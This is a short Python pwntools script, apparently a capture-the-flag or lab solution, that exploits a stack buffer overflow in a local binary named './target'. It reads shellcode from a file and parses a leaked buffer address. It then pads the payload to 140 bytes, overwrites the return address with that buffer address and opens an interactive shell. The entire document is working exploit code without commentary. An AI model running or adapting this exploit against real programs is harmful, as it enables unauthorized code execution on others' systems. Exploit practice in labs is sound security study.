from pwn import *

p = process("./target")

with open("shellcode", "rb") as f:
    shell = f.read()

print(shell)
buff_addr = int(p.recvline(), 16)
payload = shell + ("A"*(140 - len(shell))).encode() + p32(buff_addr)

p.sendline(payload)
p.interactive()
